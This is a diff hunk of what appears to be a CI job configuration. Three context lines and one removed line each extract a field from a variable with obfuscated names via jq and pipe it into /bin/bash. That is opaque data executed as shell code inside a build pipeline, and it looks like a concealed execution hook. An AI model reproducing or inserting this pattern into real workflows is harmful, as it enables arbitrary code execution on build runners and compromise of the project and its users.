@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$uts49792" | jq -r .ugttf0086 | /bin/bash
           echo $hqgco12 | jq -r .cr6 | /bin/bash
           printf '%s' "$nyot05041" | jq -r .tba8420 | /bin/bash
-          echo $z10 | jq -r .utswg85 | /bin/bash
 
       - name: Persist results
         if: always()
